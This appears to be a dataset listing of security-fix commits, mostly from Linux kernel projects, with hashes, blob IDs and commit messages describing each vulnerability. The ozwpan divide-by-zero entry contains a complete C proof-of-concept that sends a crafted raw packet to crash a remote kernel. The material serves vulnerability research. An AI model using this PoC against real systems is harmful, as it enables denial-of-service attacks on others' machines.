    418795caa8979fd0eb5d19e4d1fe3376fc0e9b20
    4cdbc107606f037c6404f9947beb80174b961e80
    70628a3e806821844d610531f75747cf5d970756
    879933aaed4c07ecd9cdad1809939ff729a588a7
    88f759adf3afba28af3b1a694220c18f5e895616
    95ee7d8682e7447f45f5ddb0ddbde5fff196c84e
    a19ae1968d379d70ad36e51039d79469cfe30d18
    a2c33a4dc7bab45e520556557924b62d24951d85
    abf56b2a14f9bc0a9f7c83fbcabaa2e97b3eca37
    bbedbfcb42c2505fceb57fa058f262d90e1670ed
    cf9ebf10c84158e107037299c76aff228094e21d
    d50e7ca6aeeadb333541d3b6865047ddc40f5db0
    d92c490e66fa84e432f11086642c091f5831da65
    e56162cd65b053b7a86119737dd7ca91329573d7
    fe20c319a0bb37dd475b7a8a32dccd57ac4e15d9
Projects:
    0-T-0_ps4-linux
Commit Message for 4de930efc23b92ddf88ce91c405ee645fe6e27ea:
net: validate the range we feed to iov_iter_init() in sys_sendto/sys_recvfrom\n\nCc: stable@vger.kernel.org # v3.19 Signed-off-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    f0c094a1b745d91ef2f9a4eae2149aac026a5789
File(s) In Commit: 
    src/lib/krb5/krb/bld_princ.c
Blob(s) In Commit: 
    8604268ceb883d4c0b2a1499b24ddb32bc59424a
Blob(s) Before Fix: 
    3dbe3561d559ac6602f618e26db3b25eb7486c2a
    ab6fed897f18eae113a4e4e3bc04336364128150
Projects:
    3van_krb5
Commit Message for f0c094a1b745d91ef2f9a4eae2149aac026a5789:
Fix build_principal memory bug [CVE-2015-2697]\n\nIn build_principal_va(), use k5memdup0() instead of strdup() to make a copy of the realm, to ensure that we allocate the correct number of bytes and do not read past the end of the input string.  This bug affects krb5_build_principal(), krb5_build_principal_va(), and krb5_build_principal_alloc_va().  krb5_build_principal_ext() is not affected.\n\nCVE-2015-2697:\n\nIn MIT krb5 1.7 and later, an authenticated attacker may be able to cause a KDC to crash using a TGS request with a large realm field beginning with a null byte.  If the KDC attempts to find a referral to answer the request, it constructs a principal name for lookup using krb5_build_principal() with the requested realm.  Due to a bug in this function, the null byte causes only one byte be allocated for the realm field of the constructed principal, far less than its length. Subsequent operations on the lookup principal may cause a read beyond the end of the mapped memory region, causing the KDC process to crash.\n\nCVSSv2: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C\n\nticket: 8252 (new) target_version: 1.14 tags: pullup

======================================================================
Commit With Fix: 
    b4ecd95debaf0a8712bd1d34def83f41fc6b3579
File(s) In Commit: 
    lib/paperclip_processors/cropper.rb
Blob(s) In Commit: 
    184afddb1e49e8477b6d377de72c157d6b8a943d
Blob(s) Before Fix: 
    a2807f6c04f952de5c621aaa71b43a6a3ea49f53
Projects:
    ANiWarlock_papercrop
Commit Message for b4ecd95debaf0a8712bd1d34def83f41fc6b3579:
Sanitized crop input, logs with Paperclip log function if anything weird happens

======================================================================
Commit With Fix: 
    956421fbb74c3a6261903f3836c0740187cf038b
File(s) In Commit: 
    arch/x86/kernel/entry_64.S
Blob(s) In Commit: 
    1d74d161687c9f2a71f334b5530067356310af18
Blob(s) Before Fix: 
    10074ad9ebf85ed82e552f055baebfa6bb3169f2
    1e96c3628bf24fc4fe0086ac6f9dc70b2c1c590d
    2fac1343a90b605fe41ebcde6ca965bd25021489
    727208941030943370fde4160b6f9ad54e62b68b
    90878aa38dbd7fac20bb42386248f1d860f26ff1
    9ebaf63ba18212559728664d4c69385e7321d4f2
    c0226ab541061870bb590a9c817d0770e618697c
    cdc79b5cfcd925c014010a3fe60723a14143616a
    db13655c3a2aff4a4475a9adf6ce1cb5b3639220
    df088bb03fb3ffec9148c7cc44cb65ef1aa36118
Projects:
    0-T-0_ps4-linux
Commit Message for 956421fbb74c3a6261903f3836c0740187cf038b:
x86/asm/entry/64: Remove a bogus 'ret_from_fork' optimization\n\n'ret_from_fork' checks TIF_IA32 to determine whether 'pt_regs' and the related state make sense for 'ret_from_sys_call'.  This is entirely the wrong check.  TS_COMPAT would make a little more sense, but there's really no point in keeping this optimization at all.\n\nThis fixes a return to the wrong user CS if we came from int 0x80 in a 64-bit task.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Cc: Borislav Petkov <bp@alien8.de> Cc: Denys Vlasenko <dvlasenk@redhat.com> Cc: H. Peter Anvin <hpa@zytor.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: <stable@vger.kernel.org> Link: http://lkml.kernel.org/r/4710be56d76ef994ddf59087aad98c000fbab9a4.1424989793.git.luto@amacapital.net [ Backported from tip:x86/asm. ] Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    bd20bb02e75e2c0483832b52f2577253febfb690
File(s) In Commit: 
    das_watchdog.c
Blob(s) In Commit: 
    8473fe8752783e53069098fd46acc55015964615
Blob(s) Before Fix: 
    c98bbea995b8374b3b5c202309646e5a67616e41
Projects:
    atsampson_das_watchdog
Commit Message for bd20bb02e75e2c0483832b52f2577253febfb690:
Fix memory overflow if the name of an environment is larger than 500 characters. Bug found by Adam Sampson.

======================================================================
Commit With Fix: 
    668ece96be210e742a4e2820a3085b215cf55104
File(s) In Commit: 
    server/src/main/java/com/orientechnologies/orient/server/network/protocol/http/OHttpSessionManager.java
Blob(s) In Commit: 
    51a16a4349e206c787b580c2c25ef380bff41df0
Blob(s) Before Fix: 
    0cf02f4fe1ad78e09a2b7e03a2ad5f08becadfe7
    bcc581a06d69d8afe2a991db7efd344e7dd4d5be
    ddc8315d26c2a48d42b872bb9783ceb5e542dff2
Projects:
    21arunava_orientdb
Commit Message for 668ece96be210e742a4e2820a3085b215cf55104:
Adopted SecureRandom to avoid predicable random numbers in session

======================================================================
Commit With Fix: 
    6fd99094de2b83d1d4c8457f2c83483b2828e75a
File(s) In Commit: 
    net/ipv6/ndisc.c
Blob(s) In Commit: 
    14ecdaf06bf7497dc71199fc5638b49592a24655
Blob(s) Before Fix: 
    09a22f4f36c9e069c6dfb3074909691ef2c82399
    2edce30ef7338cdf1916eef98b353c7dbbc7bcda
    339078f95d1b6b955d29f094cf281f7835096f9c
    471ed24aabaec4b1d8736438696ca3490d4e0f58
    4cb45c1079a29f4b7b59201e829905a5c65ac9fe
    682866777d5383dabaf6e3ae2f6f2deef261f557
    76ef4353d51872c1688b52531eadf1f4f446a8a4
    ca8d4ea48a5d9fa641bf129a6fc5e3b428799fa4
    d375ce60463e80feaead6aad56f9400e7b6da70c
    d8f02ef88e59b265322890025aa22e51815abb3a
Projects:
    0-T-0_ps4-linux
Commit Message for 6fd99094de2b83d1d4c8457f2c83483b2828e75a:
ipv6: Don't reduce hop limit for an interface\n\nA local route may have a lower hop_limit set than global routes do.\n\nRFC 3756, Section 4.2.7, "Parameter Spoofing"\n\n>   1.  The attacker includes a Current Hop Limit of one or another small >       number which the attacker knows will cause legitimate packets to >       be dropped before they reach their destination.\n\n>   As an example, one possible approach to mitigate this threat is to >   ignore very small hop limits.  The nodes could implement a >   configurable minimum hop limit, and ignore attempts to set it below >   said limit.\n\nSigned-off-by: D.S. Ljungmark <ljungmark@modio.se> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3ed82f4ed0095768529afc22b923c8f7171fff70
File(s) In Commit: 
    print-wb.c
Blob(s) In Commit: 
    4fa5e3800fbf3b341a212c848fe6a3926ea94e08
Blob(s) Before Fix: 
    38c2a6727c6cbff449658f8e93d1d76fa349692a
    3e3b06452eda646886d5fac13cba8f8fe7da580c
Projects:
    0xmitsurugi_tcpdump
Commit Message for 3ed82f4ed0095768529afc22b923c8f7171fff70:
whiteboard: fixup a few reversed tests (GH #446)\n\nThis is a follow-up to commit 3a3ec26.

======================================================================
Commit With Fix: 
    3746b7627218438ae7d781fc8b18a221454e9091
File(s) In Commit: 
    src/daemon/abrt-handle-upload.in
Blob(s) In Commit: 
    e812ef045a5accc585c2f2c2946280f4aa61d693
Blob(s) Before Fix: 
    45ba72dbb3b29a4dfe417382e60e911d86ab52fa
Projects:
    AlexxNica_abrt
Commit Message for 3746b7627218438ae7d781fc8b18a221454e9091:
upload: validate and sanitize uploaded dump directories\n\nIt was discovered that, when moving problem reports from /var/spool/abrt-upload to /var/spool/abrt or /var/tmp/abrt, abrt-handle-upload does not verify that the new problem directory has appropriate permissions and does not contain symbolic links.  A crafted problem report exposes other parts of abrt to attack, and the abrt-handle-upload script allows to overwrite arbitrary files.\n\nAcknowledgement:\n\nThis issue was discovered by Florian Weimer of Red Hat Product Security.\n\nRelated: #1212953\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>

======================================================================
Commit With Fix: 
    d7759d3ddae5fe99a340c88a1d370d65cfa73fd6
File(s) In Commit: 
    sos/sosreport.py
Blob(s) In Commit: 
    99b5f47085fba9a292baea6d9fdd67f149844029
Blob(s) Before Fix: 
    664414f5573cd402144b31a43a0bb0e5d44b8922
Projects:
    Amitgb14_sos
Commit Message for d7759d3ddae5fe99a340c88a1d370d65cfa73fd6:
[sosreport] fix archive permissions regression\n\nRestore the umask save/restore around archive creation and ensure the effective umask is 077 at the time of archive creation.\n\nFixes #425.\n\nSigned-off-by: Bryn M. Reeves <bmr@redhat.com>

======================================================================
Commit With Fix: 
    48d9951d879e0c8cbb59d4b64ab59d53ef88310d
File(s) In Commit: 
    artemis-selector/src/main/java/org/apache/activemq/artemis/selector/filter/XalanXPathEvaluator.java
Blob(s) In Commit: 
    007f5ff13ab1798d204bbc51ceb8dbb5ca760175
Blob(s) Before Fix: 
    315773e5e8aa35b80106aa2952c7286949f8b34c
Projects:
    1984shekhar_activemq-artemis
Commit Message for 48d9951d879e0c8cbb59d4b64ab59d53ef88310d:
ActiveMQ6-112 Add defaults to the selector parser doc builder

======================================================================
Commit With Fix: 
    ee73f656a604d5aa9df86a97102e4e462dd79924
File(s) In Commit: 
    arch/x86/kvm/i8254.c
Blob(s) In Commit: 
    15578f180e596bee481f10451ec375b6ceb37f26
Blob(s) Before Fix: 
    144e7f60b5e2c50f14edde7e3732761fbc22d8d9
    21f68e00524f51e32ad479f80446a515c1f6817a
    296aba49472ae3cdcf7580bc79d60d83ed48ce3e
    4d6f0d293ee29bb303dbe5e4b81b4cb3c9e2b6e2
    7e361b4d2a8cab9177ecb9ad43691ff1529513c8
    82ad523b490187c4d2f9cea90228293f868c8496
    88ad1627a89d0c6a420f7bfa0ddd953a89b33b2a
    c13bb92d3157708a52e211b1992a71f45554ffbb
    fab7440c9bb2c84fc4b83d2e8346e6b82afce211
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for ee73f656a604d5aa9df86a97102e4e462dd79924:
KVM: PIT: control word is write-only\n\nPIT control word (address 0x43) is write-only, reads are undefined.\n\nCc: stable@kernel.org Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    aca8d4f898b436ff6754e1a9ab96cae976c8a853
File(s) In Commit: 
    tlslite/tlsrecordlayer.py
Blob(s) In Commit: 
    06e5597da7f49ea1399eee1aca3aafa867ccacb9
Blob(s) Before Fix: 
    2cf94a061a546e815dba070709aa49c8e099e7ab
    5fe74102d0b017ff78cf6159332403c335d3b465
    b0833febc2e85d8fda19316fdc9d1cdb5cb5cdb5
    b9ade02f5c2a5d400a014e0abaff345fc62cb009
    ecabd56151771518522236a1ee8441aed17d3223
Projects:
    0xDiBa_tlslite
Commit Message for aca8d4f898b436ff6754e1a9ab96cae976c8a853:
Fix IndexError on junk message.

======================================================================
Commit With Fix: 
    6b7339f4c31ad69c8e9c0b2859276e22cf72176d
File(s) In Commit: 
    mm/memory.c
Blob(s) In Commit: 
    388dcf9aa283c83ee78dcf22503de253e812a27d
Blob(s) Before Fix: 
    037b812a953141f3dc77b1f7402b29bb54cd9e44
    11b9ca1767408dddb147c4b225de0aa31b8f17e7
    17734c3c1183ed799257d40eef18da55d809dd4a
    22e037e3364e0f49dcdc1de812181f54755bbbac
    2a9e09870c201074a13f92084cf4ec2b01a77b63
    3e503831e042a6aa7b96d2608ecb570dfffa0aa7
    5d9025f3b3e1cd65bd97655ee95d6cd2f390ce5b
    5ec794f13f8a8038ea4439d0c7b945a920a823a8
    649e7d440bd763fa647d47722abb6471cb75ab79
    76dcee3177146f0fa8820c5585f8674271b6f12c
    7e8d8205b6108fcf5b0a97aad3da36c9455b230f
    8068893697bbdbb5d64f9d43508658d601a6932e
    97839f5c8c303df324a1cec1dfacadb1b0bfa04c
    a84fbb772034f2e73eac300e254bd54f2a36ce03
    ac20b2a6a0c35124da70aa2cbbaf5f5ba571f235
    ca920d1fd314a17c7250d7916bd37403afa96b79
    deb679c31f2ab897cafebf72643aec4f66233308
Projects:
    0-T-0_ps4-linux
Commit Message for 6b7339f4c31ad69c8e9c0b2859276e22cf72176d:
mm: avoid setting up anonymous pages into file mapping\n\nReading page fault handler code I've noticed that under right circumstances kernel would map anonymous pages into file mappings: if the VMA doesn't have vm_ops->fault() and the VMA wasn't fully populated on ->mmap(), kernel would handle page fault to not populated pte with do_anonymous_page().\n\nLet's change page fault handler to use do_anonymous_page() only on anonymous VMA (->vm_ops == NULL) and make sure that the VMA is not shared.\n\nFor file mappings without vm_ops->fault() or shred VMA without vm_ops, page fault on pte_none() entry would lead to SIGBUS.\n\nSigned-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9b6e6a8334d56354853f9c255d1395c2ba570e0a
File(s) In Commit: 
    arch/x86/entry/entry_64.S
Blob(s) In Commit: 
    8668bbdd2bcac4792fdfe73f9e3181549a92f7fb
Blob(s) Before Fix: 
    062feb4eb47840166b742bdeeac9da603b361a6a
Projects:
    0-T-0_ps4-linux
Commit Message for 9b6e6a8334d56354853f9c255d1395c2ba570e0a:
x86/nmi/64: Switch stacks on userspace NMI entry\n\nReturning to userspace is tricky: IRET can fail, and ESPFIX can rearrange the stack prior to IRET.\n\nThe NMI nesting fixup relies on a precise stack layout and atomic IRET.  Rather than trying to teach the NMI nesting fixup to handle ESPFIX and failed IRET, punt: run NMIs that came from user mode on the normal kernel stack.\n\nThis will make some nested NMIs visible to C code, but the C code is okay with that.\n\nAs a side effect, this should speed up perf: it eliminates an RDMSR when NMIs come from user mode.\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Reviewed-by: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    810bc075f78ff2c221536eb3008eac6a492dba2d
File(s) In Commit: 
    arch/x86/entry/entry_64.S
Blob(s) In Commit: 
    d8ab2b201fa197c05f24ca3361c94169123cbca4
Blob(s) Before Fix: 
    5c4ab384b84f176e16e56771ccf76818cb295599
Projects:
    0-T-0_ps4-linux
Commit Message for 810bc075f78ff2c221536eb3008eac6a492dba2d:
x86/nmi/64: Use DF to avoid userspace RSP confusing nested NMI detection\n\nWe have a tricky bug in the nested NMI code: if we see RSP pointing to the NMI stack on NMI entry from kernel mode, we assume that we are executing a nested NMI.\n\nThis isn't quite true.  A malicious userspace program can point RSP at the NMI stack, issue SYSCALL, and arrange for an NMI to happen while RSP is still pointing at the NMI stack.\n\nFix it with a sneaky trick.  Set DF in the region of code that the RSP check is intended to detect.  IRET will clear DF atomically.\n\n( Note: other than paravirt, there's little need for all this   complexity. We could check RIP instead of RSP. )\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Cc: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    ccfe8c3f7e52ae83155cb038753f4c75b774ca8a
File(s) In Commit: 
    arch/x86/crypto/aesni-intel_glue.c
Blob(s) In Commit: 
    54f60ab41c63025fd2cb42e5579df7f69c3d9b60
Blob(s) Before Fix: 
    1b9c22bea8a7de8f6e63b200d77733bd2bb0f3c5
    545d0ce5981839583d1ed6f185d6df64a9c13c1b
    5a93783a8a0d4f4d5688fa9ce9523b8a204ecdf6
    70fece226d17463ab140e55650b4bee1964a08ce
    888950f29fd90f09574db838251725c49e28934a
    947c6bf52c330452cfb7ac4a19d368f68f4e4509
    948ad0e77741ca87836d7ea54bb211a41c590afc
    95ad7adeb5fbea6f843b9f043d98604d61b9d6cf
    a0795da22c0273286119312018f5dfe21c4ac9ca
    a7ccd57f19e45531744eeab841c5ac7e41101074
    ae855f4f64b7755410701753f79608d0408880f9
    c799352e24fce3897c1c776916c435300d567294
Projects:
    0-T-0_ps4-linux
Commit Message for ccfe8c3f7e52ae83155cb038753f4c75b774ca8a:
crypto: aesni - fix memory usage in GCM decryption\n\nThe kernel crypto API logic requires the caller to provide the length of (ciphertext || authentication tag) as cryptlen for the AEAD decryption operation. Thus, the cipher implementation must calculate the size of the plaintext output itself and cannot simply use cryptlen.\n\nThe RFC4106 GCM decryption operation tries to overwrite cryptlen memory in req->dst. As the destination buffer for decryption only needs to hold the plaintext memory but cryptlen references the input buffer holding (ciphertext || authentication tag), the assumption of the destination buffer length in RFC4106 GCM operation leads to a too large size. This patch simply uses the already calculated plaintext size.\n\nIn addition, this patch fixes the offset calculation of the AAD buffer pointer: as mentioned before, cryptlen already includes the size of the tag. Thus, the tag does not need to be added. With the addition, the AAD will be written beyond the already allocated buffer.\n\nNote, this fixes a kernel crash that can be triggered from user space via AF_ALG(aead) -- simply use the libkcapi test application from [1] and update it to use rfc4106-gcm-aes.\n\nUsing [1], the changes were tested using CAVS vectors to demonstrate that the crypto operation still delivers the right results.\n\n[1] http://www.chronox.de/libkcapi.html\n\nCC: Tadeusz Struk <tadeusz.struk@intel.com> Cc: stable@vger.kernel.org Signed-off-by: Stephan Mueller <smueller@chronox.de> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    8b01fc86b9f425899f8a3a8fc1c47d73c2c20543
File(s) In Commit: 
    fs/exec.c
Blob(s) In Commit: 
    49a1c61433b73722683cad25eef1fb92045e265a
Blob(s) Before Fix: 
    02bfd980a40c7df568bc1f9b847600fd76c2861d
    7302b75a9820fa5c6342e098bb8757c31d884a4e
    a2b42a98c743b80941d7ae1f6caf9ca7158ca1ea
    ad8798e26be9f6e40d15607d0971bc2143611fcc
    c7f9b733406dc22165647a8f415ce00324ae7daf
    e1529b4c79b1c29b300ab6519a94d7b748069e33
Projects:
    0-T-0_ps4-linux
Commit Message for 8b01fc86b9f425899f8a3a8fc1c47d73c2c20543:
fs: take i_mutex during prepare_binprm for set[ug]id executables\n\nThis prevents a race between chown() and execve(), where chowning a setuid-user binary to root would momentarily make the binary setuid root.\n\nThis patch was mostly written by Linus Torvalds.\n\nSigned-off-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c41e8885b862b9fce2719449bc9336f0bea658ef
File(s) In Commit: 
    lib/Module/Signature.pm
Blob(s) In Commit: 
    51cef598e44a164435b1b80faba36d4e8a6658b8
Blob(s) Before Fix: 
    154c5925d825e328ffffc93681302337114002f6
Projects:
    bk_module-signature
Commit Message for c41e8885b862b9fce2719449bc9336f0bea658ef:
* Avoid loading modules from relative paths in @INC for Text::Diff etc.\n\n  Also reported by John Lightsey.

======================================================================
Commit With Fix: 
    e8714f6f93d1a32f4e4655209960afcf4c185214
File(s) In Commit: 
    libavcodec/h264.c
Blob(s) In Commit: 
    06d8dec82e4e0c7963866d28d15ee95b209d5159
Blob(s) Before Fix: 
    222bf58b10f416d0201a05b06c0ede859aed6adc
Projects:
    00ERNEST00_FFmpeg
Commit Message for e8714f6f93d1a32f4e4655209960afcf4c185214:
avcodec/h264: Clear delayed_pic on deallocation\n\nFixes use of freed memory\n\nFixes: case5_av_frame_copy_props.mp4 Found-by: Michal Zalewski <lcamtuf@coredump.cx> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    a134f083e79fb4c3d0a925691e732c56911b4326
File(s) In Commit: 
    net/ipv4/ping.c
Blob(s) In Commit: 
    05ff44b758dfee1e02996a3726ac63854a96ad16
Blob(s) Before Fix: 
    044a0ddf6a791ace04fbb1802e64563bf3fc5518
    148678dd045cb3cb4dca7fd56822b8358d7e839f
    208d5439e59b2e8c3ccb2da46c292ad4f75b3784
    242e7f4ed6f44ff5765966388618152e2721fa87
    2a3720fb5a5ff5401c5efbef49427fb18dbbfa5e
    2d11c094296e77ceb36b4121df01d7e5318de591
    2ed64bca54e351e1ab51f7604b65ac72cbfb8e59
    344e7cdfb8d40a91b3d8fd0eff0da96a14370922
    39b403f854c6debeb03437a2a9a0c9746083b399
    3a00512addbc41143bc339804059c46b41540909
    43d4c3b223699aee36de3c3c79c6d82b5236a4c0
    57f7c98041394998fe390735aa5b8cd2602b3f90
    5d740cccf69ec29d9778ddb0568c726266904ce9
    64f4edb2dbf93e2ebb9276d365862cba70422b87
    746427c9e7199513c12f4254ce048234f108a35d
    787b0d699969394832f72859133a2ed830a01c56
    7d93d62cd5fdae9f7f8a3f2e5c35f2a203df92e0
    876c6ca2d8f9e77a28f1e629aa6523df1ee8f42f
    8f3d05424a3e8f2f318c36bf007fd17724533997
    a3c59a077a5f0574f02584b0068de0703d5cb3dc
    a93f260cf24ca0a9d60346dc085eb51afdb43927
    b072386cee218ba508d572d049b2371ba9bf370e
    c0d82f78d364fe5561f819f953e3eb48d2f134da
    c9106a0906720830605686ef2b8ed7a58caa4854
    d7d9882d4caea169964a58e294ffe6c73a99d36c
    dc454ccc5039a6358b99077250b027c2459566ce
    e612991c91857152f0950251236e997f7439c7bb
    e89094ab5ddb8ce2b6eb2d78a9a9046b42287bd5
    e9f66e1cda507cf2d5cb532958d23a89beeccaba
Projects:
    0-T-0_ps4-linux
Commit Message for a134f083e79fb4c3d0a925691e732c56911b4326:
ipv4: Missing sk_nulls_node_init() in ping_unhash().\n\nIf we don't do that, then the poison value is left in the ->pprev backlink.\n\nThis can cause crashes if we do a disconnect, followed by a connect().\n\nTested-by: Linus Torvalds <torvalds@linux-foundation.org> Reported-by: Wen Xu <hotdog3645@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    04bf464a5dfd9ade0dda918e44366c2c61fce80b
File(s) In Commit: 
    drivers/staging/ozwpan/ozusbsvc1.c
Blob(s) In Commit: 
    7b13dc9101721a9a602115671659078c7b2e934a
Blob(s) Before Fix: 
    8ed561a5da2d95d63f01694cf49ccca454575935
    b573ad3e9674d959467d6b71abf5975dfa8a63e4
    f660bb198c65534a6cbe8183d3f5d0a30a532eb1
Projects:
    0-T-0_ps4-linux
Commit Message for 04bf464a5dfd9ade0dda918e44366c2c61fce80b:
ozwpan: divide-by-zero leading to panic\n\nA network supplied parameter was not checked before division, leading to a divide-by-zero. Since this happens in the softirq path, it leads to a crash. A PoC follows below, which requires the ozprotocol.h file from this module.\n\n=-=-=-=-=-=\n\n #include <arpa/inet.h>  #include <linux/if_packet.h>  #include <net/if.h>  #include <netinet/ether.h>  #include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <endian.h>  #include <sys/ioctl.h>  #include <sys/socket.h>\n\n #define u8 uint8_t  #define u16 uint16_t  #define u32 uint32_t  #define __packed __attribute__((__packed__))  #include "ozprotocol.h"\n\nstatic int hex2num(char c) { 	if (c >= '0' && c <= '9') 		return c - '0'  	if (c >= 'a' && c <= 'f') 		return c - 'a' + 10  	if (c >= 'A' && c <= 'F') 		return c - 'A' + 10  	return -1  } static int hwaddr_aton(const char *txt, uint8_t *addr) { 	int i  	for (i = 0  i < 6  i++) { 		int a, b  		a = hex2num(*txt++)  		if (a < 0) 			return -1  		b = hex2num(*txt++)  		if (b < 0) 			return -1  		*addr++ = (a << 4) | b  		if (i < 5 && *txt++ != ':') 			return -1  	} 	return 0  }\n\nint main(int argc, char *argv[]) { 	if (argc < 3) { 		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0])  		return 1  	}\n\n	uint8_t dest_mac[6]  	if (hwaddr_aton(argv[2], dest_mac)) { 		fprintf(stderr, "Invalid mac address.\n")  		return 1  	}\n\n	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)  	if (sockfd < 0) { 		perror("socket")  		return 1  	}\n\n	struct ifreq if_idx  	int interface_index  	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1)  	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { 		perror("SIOCGIFINDEX")  		return 1  	} 	interface_index = if_idx.ifr_ifindex  	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { 		perror("SIOCGIFHWADDR")  		return 1  	} 	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data \n\n	struct { 		struct ether_header ether_header  		struct oz_hdr oz_hdr  		struct oz_elt oz_elt  		struct oz_elt_connect_req oz_elt_connect_req  		struct oz_elt oz_elt2  		struct oz_multiple_fixed oz_multiple_fixed  	} __packed packet = { 		.ether_header = { 			.ether_type = htons(OZ_ETHERTYPE), 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 		}, 		.oz_hdr = { 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), 			.last_pkt_num = 0, 			.pkt_num = htole32(0) 		}, 		.oz_elt = { 			.type = OZ_ELT_CONNECT_REQ, 			.length = sizeof(struct oz_elt_connect_req) 		}, 		.oz_elt_connect_req = { 			.mode = 0, 			.resv1 = {0}, 			.pd_info = 0, 			.session_id = 0, 			.presleep = 0, 			.ms_isoc_latency = 0, 			.host_vendor = 0, 			.keep_alive = 0, 			.apps = htole16((1 << OZ_APPID_USB) | 0x1), 			.max_len_div16 = 0, 			.ms_per_isoc = 0, 			.up_audio_buf = 0, 			.ms_per_elt = 0 		}, 		.oz_elt2 = { 			.type = OZ_ELT_APP_DATA, 			.length = sizeof(struct oz_multiple_fixed) 		}, 		.oz_multiple_fixed = { 			.app_id = OZ_APPID_USB, 			.elt_seq_num = 0, 			.type = OZ_USB_ENDPOINT_DATA, 			.endpoint = 0, 			.format = OZ_DATA_F_MULTIPLE_FIXED, 			.unit_size = 0, 			.data = {0} 		} 	} \n\n	struct sockaddr_ll socket_address = { 		.sll_ifindex = interface_index, 		.sll_halen = ETH_ALEN, 		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 	} \n\n	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { 		perror("sendto")  		return 1  	} 	return 0  }\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    59c816c1f24df0204e01851431d3bab3eb76719c
File(s) In Commit: 
    drivers/vhost/scsi.c
Blob(s) In Commit: 
    ab4811f749f519e8949df19ae40679e940034b31
Blob(s) Before Fix: 
    daf10b7fa311982078a446207b3169bd1f648cd3
Projects:
    0-T-0_ps4-linux
Commit Message for 59c816c1f24df0204e01851431d3bab3eb76719c:
vhost/scsi: potential memory corruption\n\nThis code in vhost_scsi_make_tpg() is confusing because we limit "tpgt" to UINT_MAX but the data type of "tpg->tport_tpgt" and that is a u16.\n\nI looked at the context and it turns out that in vhost_scsi_set_endpoint(), "tpg->tport_tpgt" is used as an offset into the vs_tpg[] array which has VHOST_SCSI_MAX_TARGET (256) elements so anything higher than 255 then it is invalid.  I have made that the limit now.\n\nIn vhost_scsi_send_evt() we mask away values higher than 255, but now that the limit has changed, we don't need the mask.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>

======================================================================
Commit With Fix: 
    5409eb314c4e072b9760b8d30b985fa0bb96a006
File(s) In Commit: 
    src/node/hooks/express/tests.js
Blob(s) In Commit: 
    dfe02c2afc248d1307b53bac4d6b5fdc46dc5422
Blob(s) Before Fix: 
    3157d68edad408783efb3d27e6fa4b174829d806
Projects:
    00SteinsGate00_etherpad-lite
Commit Message for 5409eb314c4e072b9760b8d30b985fa0bb96a006:
fix an issue in the path handling that allowed directory traversal

======================================================================
Commit With Fix: 
    23b133bdc452aa441fcb9b82cbf6dd05cfd342d0
File(s) In Commit: 
    fs/udf/inode.c
Blob(s) In Commit: 
    7b72b7dd8906b8b6c6e6b1d848f881969630b839
Blob(s) Before Fix: 
    0c1ca254d6165d3637e7c33a8f4b4d2d2f96ee77
